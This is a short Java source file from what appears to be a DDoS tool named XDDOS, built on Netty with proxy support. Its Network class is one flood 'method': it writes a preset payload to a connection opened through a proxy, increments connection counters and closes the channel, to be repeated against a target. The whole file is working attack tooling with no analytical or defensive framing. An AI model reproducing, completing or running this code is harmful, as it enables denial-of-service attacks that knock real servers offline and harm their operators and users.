package XD.XDDOS.methods;

import XD.XDDOS.XDDOS;
import XD.XDDOS.NettyBootstrap;
import XD.XDDOS.ProxyLoader;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufOutputStream;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import java.io.IOException;

public class Network implements Method {
  public void accept(Channel channel, ProxyLoader.Proxy proxy) {
    ByteBuf b = Unpooled.buffer();
    ByteBufOutputStream out = new ByteBufOutputStream(b);
    try {
      out.writeBytes(XDDOS.string);
      out.close();
    } catch (IOException e) {
      e.printStackTrace();
    }
    channel.writeAndFlush(b);
    NettyBootstrap.integer++;
    NettyBootstrap.totalConnections++;
    channel.close();
  }
}
